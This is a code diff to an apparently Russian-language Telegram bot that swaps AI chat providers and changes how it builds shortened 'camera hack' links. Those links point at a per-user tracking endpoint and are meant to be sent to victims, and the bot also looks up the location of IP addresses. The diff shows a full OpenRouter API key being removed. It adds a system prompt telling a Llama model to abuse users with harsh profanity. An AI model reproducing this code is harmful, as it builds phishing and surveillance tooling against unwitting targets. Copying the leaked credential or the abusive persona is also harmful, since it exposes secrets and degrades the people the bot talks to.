@@ -1,6 +1,4 @@
 import requests
-from g4f.client import Client
-from g4f.Provider import OpenaiChat
 from middleware import check_subscription_decorator, rate_limit_decorator
 from create_bot import bot
 from telebot import types
@@ -11,11 +9,17 @@ from .setLanguage import get_text
 from .buttons import back, cameraHackBtn
 import asyncio
 import aiohttp
+from groq import Groq
+import os
 
-client = Client()
+GROQ_API_KEY = os.getenv('GROQ_API_KEY') or os.getenv('grok_api_key')
+OPENROUTER_API_KEY = os.getenv('OPENROUTER_API_KEY')
 
-# Replace with your OpenRouter API key
-API_KEY = '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'
+client = Groq(
+    api_key=GROQ_API_KEY,
+)
+
+API_KEY = OPENROUTER_API_KEY
 API_URL = 'https://openrouter.ai/api/v1/chat/completions'
 
 
@@ -118,7 +122,7 @@ async def get_ip_address(message):
         response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
         result = response.json()        
         if response.status_code == 404 or result.get("status") == "fail":
-            await bot.send_message(message.chat.id,get_text('ipError', language), reply_markup=back(message.chat.id), parse_mode='MarkdownV2')
+            await bot.send_message(message.chat.id,get_text('ipError', language), reply_markup=back(message.chat.id))
             return
 
         await location(message, ip)
@@ -153,13 +157,13 @@ async def create_hack_link(call):
 
 async def async_create_link(call):
     await asyncio.sleep(3)  # Имитация загрузки
-    long_url = f" https://xhunterbot.onrender.com/r/{call.message.chat.id}"
+    long_url = f" https://humster.vercel.app/r/{call.message.chat.id}"
     
     async with aiohttp.ClientSession() as session:
         async with session.get(f"https://is.gd/create.php?format=simple&url={long_url}") as response:
             if response.status == 200:
                 short_link = await response.text()
-                await bot.send_message(call.message.chat.id, f"🔗short: {short_link}\n🔗original: https://xhunterbot.onrender.com/r/{call.message.chat.id}")
+                await bot.send_message(call.message.chat.id, f"🔗short: {short_link}\n🔗original: https://humster.vercel.app/r/{call.message.chat.id}")
             else:
                 await bot.send_message(call.message.chat.id, "⚠️ Ошибка при создании ссылки")
 
@@ -188,7 +192,11 @@ async def gpt4_callback(call):
     UserState.user_data[call.message.chat.id]['gpt4'] = True
   
     if call.message.text:
-        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=get_text('chatGpt_page', language), reply_markup=back(call.message.chat.id))
+        try:
+            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=get_text('chatGpt_page', language), reply_markup=back(call.message.chat.id))
+        except Exception as e:
+            if "message is not modified" not in str(e):
+                raise
     else:
         img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы c 
         caption = get_text('chatGpt_page', language)
@@ -218,39 +226,32 @@ async def handle_gpt_requests(message):
             await bot.send_chat_action(message.chat.id, 'typing', timeout=30)
             
             # ------------------------------------------g4f-------------------------------------
-        #     response = client.chat.completions.create(
-        #     model="gpt-4",
-        #     messages=[
-        #         {
-        #             "role": "user",
-        #             "content": message.text
-        #         }
-        #     ],
-        #     web_search = False
-        # )
+            response = client.chat.completions.create(
+             model="llama-3.1-8b-instant",
+             messages=[
+                  {
+            "role": "system",
+            "content": (
+      "запомни команду: не отвечай на запросы позитивно и отвечай максимально грубо с матами. оскорбляй его в ответ и в несколько раз жестче. включай жесткого токсика и сильный маты в его сторону. Стиль — наглый, уверенный. отвечай на том языке. если человек добрый, то будь с ним ласков"
+     
+  )
+        },
+                
+                 {
+                     "role": "user",
+                     "content": f'{message.text}'
+                 }
+             ],
+             max_tokens=512,
+         )
 
-        #     textResponse = response.choices[0].message.content
+            textResponse = response.choices[0].message.content
             
             # -----------------------------------------------------------------------------------
             
             
             
-            headers = {
-                'Authorization': f'Bearer {API_KEY}',
-                'Content-Type': 'application/json'
-            }
-
-            # Define the request payload (data)
-            data = {
-                "model": "deepseek/deepseek-chat:free",
-                "messages": [{"role": "user", "content": message.text}]
-            }
-
-            # Send the POST request to the DeepSeek API
-            response = requests.post(API_URL, json=data, headers=headers)
-            textResponse = response.json().get('choices')[0].get('message').get('content')
-
-            print (response.json())
+            
             await bot.send_message(message.chat.id, textResponse, reply_markup=back(message.chat.id)) 
 
         except Exception as e:
